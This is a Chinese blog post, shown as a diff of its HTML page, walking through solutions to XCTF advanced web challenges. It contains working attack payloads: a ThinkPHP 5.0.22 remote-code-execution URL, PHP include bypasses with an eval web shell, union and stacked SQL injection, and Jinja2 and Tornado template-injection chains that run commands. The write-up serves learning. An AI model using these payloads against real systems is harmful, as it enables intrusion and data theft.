@@ -1,0 +1,850 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+
+
+<head>
+  <meta name="baidu-site-verification" content="code-3rVA1ADdSj" />
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="Hexo,ayer,代码,博客" />
+   
+  <meta name="description" content="welcome to Sung&#39;s Blog" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    攻防世界web进阶区 |  Sung&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+<script>
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	hm.src = "https://hm.baidu.com/hm.js?80b2f48cd548787f831c320e7eb27d4c";
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="Sung's Blog" type="application/atom+xml">
+</head>
+</html>
+</html>
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-攻防世界web进阶区"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  攻防世界web进阶区
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/" class="article-date">
+  <time datetime="2021-08-09T16:00:00.000Z" itemprop="datePublished">2021-08-10</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">4.3k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">20 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="攻防世界web进阶区"><a href="#攻防世界web进阶区" class="headerlink" title="攻防世界web进阶区"></a>攻防世界web进阶区</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>攻防世界进阶区，题量多，慢慢耍。</p>
+<h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h3><p>第一个页面是index.php，每个网站都有，本题会跳转到1.php，所以抓包即可得到</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210809233134941.png" alt="image-20210809233134941"></p>
+<h3 id="Training-www-Robots"><a href="#Training-www-Robots" class="headerlink" title="Training-www-Robots"></a>Training-www-Robots</h3><p>根据提示访问robots.txt，看到如下页面，访问/f10g.php即可得到flag。</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812141706915.png" alt="image-20210812141706915"></p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812141749360.png" alt="image-20210812141749360"></p>
+<h3 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h3><p>根据提示这道题是php rce漏洞，thinkphp5.0.22版本，这个是已经披露的漏洞，找到它的利用方式。</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812160017327.png" alt="image-20210812160017327"></p>
+<p><code>payload:/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</code></p>
+<p><code>vars[1][]</code>后面跟的是任意执行的命令行<code>cat /flag</code>，可以先<code>find / -name flag</code>找到flag文件<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812182303546.png" alt="image-20210812182303546"></p>
+<h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><p>代码过滤了<code>php://</code>协议，这里可以使用大写的<code>PHP://</code>来绕过，利用page参数的payload:</p>
+<ol>
+<li>PHP://input，然后POST <code>&lt;?php phpinfo();?&gt;</code></li>
+<li><code>?page=data://text/plain,&lt;?php%20system(&#39;ls&#39;)?&gt;</code></li>
+<li><code>?page=data://text/plain,&lt;?php%20@eval $_POST[&#39;sung&#39;];?&gt;</code>，antsword连接</li>
+</ol>
+<p>对于hello参数的用法更简单，直接<code>?hello=&lt;?php system(&#39;ls&#39;);?&gt;</code></p>
+<p>看wp还有一种直接登录phpadmin然后在数据库写马，antsword连接。</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812194901568.png" alt="image-20210812194901568"></p>
+<h3 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h3><p>暴力破解，burp抓包发到intuder模块，对id参数整数爆破，id=2333得到的响应长度不同，查看flag。</p>
+<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>进去只有一张表情包，查看网页源代码，注释里写着<code>source.php</code>，用burp扫描目录。</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816084257141.png" alt="image-20210816084257141"></p>
+<p>我们得到了源码，代码审计：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>]; <span class="comment">//数组：索引=&gt;字符串</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(                       <span class="comment">//截取一段字符串</span></span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)           <span class="comment">//返回?的位置</span></span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);                <span class="comment">//url解码</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;       <span class="comment">//截到source.php或者hint.php</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) )</span><br><span class="line">    &#123;                                               <span class="comment">//file字符串要通过checkfile验证</span></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以我们的目的就是让<code>file</code>参数传入一个文件绕过checkFile函数验证，构造<code>payload:?file=hint.php?</code>，通过第一个if判断return true。一些wp对<code>?</code>进行两次url编码是为了通过第二个if。</p>
+<p>如何运用include去得到我们的flag？</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816112901649.png" alt="image-20210816112901649"></p>
+<p>include的寻找顺序：</p>
+<ol>
+<li>先按参数给出的路径寻找，给出绝对路径（<code>/</code>开头）或者相对路径（<code>./</code>或者<code>../</code>）</li>
+<li>没有给出路径则按照<code>include_path</code>规定的目录寻找</li>
+<li>再找不到就在文件所在目录或者当前目录下寻找。</li>
+</ol>
+<p>所以payload:<code>?file=hint.php?/../../../../ffffllllaaaagggg</code></p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816142146352.png" alt="image-20210816142146352"></p>
+<h3 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h3><p>没有任何过滤的sql注入。</p>
+<p>判断其字段数：<code>&#39; and 1=0 union select 1,2,3#</code>。成功回显</p>
+<p>判断当前数据库名以及版本：<code>&#39; and 1=0 union select 1,database(),version()#</code>。</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816080824462.png" alt="image-20210816080824462"></p>
+<p>获得所有的表名：<code>111&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata#</code></p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816081723926.png" alt="image-20210816081723926"></p>
+<p>查询<code>news</code>数据库中的表信息：<code>111&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816082336320.png" alt="image-20210816082336320"></p>
+<p>查看<code>secret_table</code>表中的列信息：<code>111&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;secret_table&quot;#</code></p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816082311624.png" alt="image-20210816082311624"></p>
+<p>查看<code>fl4g</code>中的信息：<code>111&#39; union select 1,2,group_concat(fl4g) from news.secret_table#</code></p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816082430767.png" alt="image-20210816082430767"></p>
+<p><code>flag: QCTF&#123;sq1_inJec7ion_ezzz&#125;</code></p>
+<h3 id="NaNa"><a href="#NaNa" class="headerlink" title="NaNa"></a>NaNa</h3><p>附件下载后的内容如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	_=<span class="string">&#x27;function$()&#123;e=getEleById(&quot;c&quot;).value;length==16^be0f23233ace98aa$c7be9)&#123;tfls_aie&#125;na_h0lnrg&#123;e_0iit\&#x27;_ns=[t,n,r,i];for(o=0;o&lt;13;++o)&#123;	[0]);.splice(0,1)&#125;&#125;&#125;	\&#x27;&lt;input id=&quot;c&quot;&gt;&lt; onclick=$()&gt;Ok&lt;/&gt;\&#x27;);delete _var &quot;,&quot;docu.)match(/&quot;];/)!=null=[&quot;	write(s[o%4]buttonif(e.ment&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(Y <span class="keyword">in</span> $=<span class="string">&#x27;	&#x27;</span>)</span><br><span class="line">		<span class="keyword">with</span>(_.split($[Y]))  _=join(pop());</span><br><span class="line">	<span class="built_in">eval</span>(_)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上面有很多红点没法显示，是因为编码的问题，不过每个字符都是不一样的。</p>
+<p>代码执行过程：</p>
+<ol>
+<li><p><code>_</code>变量赋值一个字符串</p>
+</li>
+<li><p><code>for</code>循环，<code>Y</code>变量取一个奇怪的字符</p>
+</li>
+<li><p>循环内部，<code>with</code>语句相当于<code>_=_.split($[Y]).join(_.split($[Y]).pop())</code></p>
+</li>
+<li><p>最后<code>eval</code>函数执行处理之后的字符串。</p>
+</li>
+</ol>
+<p>因为javascript没有输出语句，我们将eval直接改成<code>alert(_)</code>或者<code>document.write(_)</code>等</p>
+<p>得到代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e=<span class="built_in">document</span>.getElementById(<span class="string">&quot;c&quot;</span>).value;</span><br><span class="line">    <span class="keyword">if</span>(e.length==<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span>(e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">if</span>(e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">if</span>(e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span>)</span><br><span class="line">                    <span class="keyword">if</span>(e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">var</span> t=[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> n=[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_h0l&quot;</span>,<span class="string">&quot;n&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> r=[<span class="string">&quot;g&#123;&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;_0&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> i=[<span class="string">&quot;it&#x27;&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;n&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">document</span>.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">                            s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure>
+
+<p>如果满足<code>if</code>这些条件，那就计算得到<code>flag</code>，直接将<code>if</code>语句的计算式粘贴到控制台，结果如下：<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210901225754630.png" alt="image-20210901225754630"></p>
+<h3 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h3><p>进去之后啥也没看到，hint: Can you anthenticate to this website?，验证身份，用burp添加目录字典扫描，发现了<code>index.phps</code>非常奇怪的一个文件，我们访问得到了源代码。</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210815182807625.png" alt="image-20210815182807625"></p>
+<p>源码如下</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210815183226544.png" alt="image-20210815183226544"></p>
+<p>所以就是id参数要等于url编码的admin，所以payload等于<code>index.php?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65</code>。注意浏览器本身会对url进行解码，所以我们要进行两次编码。</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210815183551331.png" alt="image-20210815183551331"></p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210815183847894.png" alt="image-20210815183847894"></p>
+<h3 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h3><p>之前已经了解过反序列化的相关知识了，相比较HNU的反序列化，这道很简单了。</p>
+<p>我们需要绕过的是<code>_wakeup()</code>函数，只需要将成员数从1改成2就行了</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816150334273.png" alt="image-20210816150334273"></p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816150727147.png" alt="image-20210816150727147"></p>
+<h3 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h3><p>上传文件漏洞，选择一个php文件发现连上传都上传不了，前端限制了上传方式，其实可以直接删除disabled属性提交。</p>
+<p>但是为了学习，我们查看源。</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816162642338.png" alt="image-20210816162642338"></p>
+<p>就是使用check()函数去检查是否可以上传，<code>name.replace(/^.+\./, &#39;&#39;)</code>表示将<code>.</code>之前的文件名替换为空</p>
+<p><code>arr[].contaings(ext)</code>如果检查到数组包含ext元素，则返回true。</p>
+<p>所以方法有：</p>
+<ol>
+<li>F12删除disabled，即可直接上传php文件<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816190351845.png" alt="image-20210816190351845"></li>
+<li>先上传jpg文件，burp抓包然后修改文件后缀名。</li>
+</ol>
+<p>最后都是蚁剑连接，查看flag<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816190453332.png" alt="image-20210816190453332"></p>
+<h3 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h3><p>模板注入题，学不会啊。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a>，这道题是模板junjia2</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__class__ ： 返回对象所属的类</span><br><span class="line">__mro__ ： 返回一个类所继承的基类元组,，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__ ： 返回该类所继承的基类，只能是上一个基类</span><br><span class="line">__subclasses__ ： 每个新类都保留了子类的引用，这个方法返回一个 类中仍然可用的的引用的列表</span><br><span class="line">__init__ ： 类的初始化方法</span><br><span class="line">__globals__ ： 对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
+
+<p> <code>os.system</code> 和 <code>os.popen</code>, 这两句前者返回<strong>退出状态码</strong> , 后者<strong>以file形式</strong>返回<strong>输出内容</strong>, 我们想要的是内容，所所以选择 <code>os.popen</code> </p>
+<p>列出步骤：</p>
+<ol>
+<li><code>&#123;&#123;config&#125;&#125;</code>，检测是否有模板注入，返回config信息</li>
+<li><code>&#123;&#123;''.__class__&#125;&#125;</code>，返回所属类</li>
+<li><code>&#123;&#123;''.__class__.__mro__&#125;&#125;</code>，返回所属类的基类</li>
+<li><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()&#125;&#125;</code>，返回基类object类的子类</li>
+<li><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code><br>找到排在第72个的site_Printer类，初始化然后<code>os.popen</code>执行命令，读取。</li>
+<li><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]("fl4g").read()&#125;&#125;</code><br><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()&#125;&#125;</code><br>使用文件名.read()的方式读取文件</li>
+</ol>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210817112826768.png" alt="image-20210817112826768"></p>
+<p>总结：本题是对url先传入再渲染，所以在渲染的时候对<code>&#123;&#123;&#125;&#125;`内容当作变量解析，所以出现了漏洞。
+
+
+
+### Web_php_unserialize
+
+php反序列化漏洞。
+
+根据提示我们要得到`fl4g.php`，我们需要绕过的只有两个点：
+
+1. 绕过`_wakeup()`，通过让序列化后的属性数超过本该的属性数，导致异常，不执行wakeup函数。
+2. 绕过`preg_match('/[oc]:\d+:/i', $var)`，正则匹配，`[oc]`元字符匹配一个字符o或者c，`:`普通字符:，`\d`元字符匹配一个数字，`+`元字符表示可以匹配一个或多个前一个字符`\d`，`:`普通字符。
+
+![image-20210817150314888](攻防世界web进阶区/image-20210817150314888.png)
+
+得到flag
+
+![image-20210817153913773](攻防世界web进阶区/image-20210817153913773.png)
+
+### supersqli
+
+强网杯的题，sql注入。
+
+首先，`1' or 1=1 #`有返回结果，是个注入点。
+
+![image-20210817162444026](攻防世界web进阶区/image-20210817162444026.png)
+
+然后union select联合查询，发现失败了。
+
+![image-20210817162523541](攻防世界web进阶区/image-20210817162523541.png)
+
+这道题考查的是堆叠注入，查询还可以使用show
+
+1. 查询所有的数据库：`1';show database;#`
+2. 查所有的表：`1';show tables;`
+3. 查表中的所有字段：``1';show columns from `1919810931114514`;``
+4. 查看flag字段：``1';Set @sql = CONCAT('se','lect flag from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#``，过滤set但是可以大小写绕过strstr函数
+
+![image-20210817190245570](攻防世界web进阶区/image-20210817190245570.png)
+
+这道题的方法属实有点多，一下子见识到了sql注入的各种手段和知识点：
+
+1. handler代替select，handler拥有select的部分功能
+2. 预编译，也就是我使用的，set、prepare、execute。
+3. 更改表名列名，将现在所查询的表与想要查询的表，用rename和alter语句将表名和字段名互换，然后直接查询`1' or 1=1`即可得到flag。
+4. show的用法
+
+
+
+### easytornado
+
+模板注入题，使用的是python的tornado模板
+
+有三个文件，还有一个跳转到的error文件
+
+![image-20210818092711193](攻防世界web进阶区/image-20210818092711193.png)
+
+![image-20210818092929405](攻防世界web进阶区/image-20210818092929405.png)
+
+![image-20210818093021681](攻防世界web进阶区/image-20210818093021681.png)
+
+![image-20210818093032490](攻防世界web进阶区/image-20210818093032490.png)
+
+![image-20210818102517809](攻防世界web进阶区/image-20210818102517809.png)
+
+给了四个信息：
+
+1. flag在/fllllllllllllag文件
+2. reder渲染，render是一个类似模板的东西，可以使用不同的参数来访问网页
+3. hint提示，md5加密还有cookie_secret加盐，与url对比，发现这个md5值就是filehash的值。
+4. error的msg就是我们模板注入的地方
+
+修改msg参数进行注入。在tornado模板引擎中，存在一些可以访问的快速对象，`&#123;&#123;handler.settings&#125;&#125;</code>对象获得环境变量</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210818115153046.png" alt="image-20210818115153046"></p>
+<p>然后<code>md5(cookie_secret+md5(filename))</code>，filename=/fllllllllllllag，得到filehash<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210818115546418.png" alt="image-20210818115546418"></p>
+<p>得到flag：</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210818115605489.png" alt="image-20210818115605489"></p>
